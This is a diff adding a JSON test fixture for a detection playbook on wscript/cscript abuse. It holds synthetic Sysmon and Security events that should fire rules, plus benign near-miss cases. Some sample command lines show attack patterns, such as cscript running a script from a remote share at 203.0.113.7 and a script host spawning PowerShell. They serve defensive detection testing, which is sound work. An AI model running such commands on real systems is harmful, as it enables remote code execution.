@@ -1,0 +1,94 @@
+{
+ "playbook": "signal_wscript_cscript_abuse",
+ "fires": [
+  {
+   "rule": "Script Host Spawned by Office",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 1,
+      "windows.channel": "Microsoft-Windows-Sysmon/Operational",
+      "Image": "C:\\Windows\\System32\\wscript.exe",
+      "CommandLine": "wscript.exe C:\\Users\\alice\\Documents\\a.js",
+      "User": "CORP\\alice",
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "Script From User Writable Path",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\wscript.exe",
+      "CommandLine": "wscript.exe \"C:\\Users\\alice\\Downloads\\invoice.vbs\"",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "Script From URL or Network Share",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\cscript.exe",
+      "CommandLine": "cscript.exe //nologo \\\\203.0.113.7\\share\\run.js",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "Script Engine Spawns PowerShell",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 1,
+      "windows.channel": "Microsoft-Windows-Sysmon/Operational",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell -nop -c whoami",
+      "User": "CORP\\alice",
+      "ParentImage": "C:\\Windows\\System32\\wscript.exe"
+     }
+    }
+   ]
+  }
+ ],
+ "near_miss": [
+  {
+   "name": "logon script from SYSVOL",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 1,
+      "windows.channel": "Microsoft-Windows-Sysmon/Operational",
+      "Image": "C:\\Windows\\System32\\cscript.exe",
+      "CommandLine": "cscript.exe //nologo C:\\Windows\\SYSVOL\\domain\\scripts\\map.vbs",
+      "User": "CORP\\alice",
+      "ParentImage": "C:\\Windows\\System32\\userinit.exe"
+     }
+    }
+   ]
+  },
+  {
+   "name": "admin script from Program Files",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\wscript.exe",
+      "CommandLine": "wscript.exe \"C:\\Program Files\\Vendor\\tools\\check.vbs\"",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  }
+ ]
+}
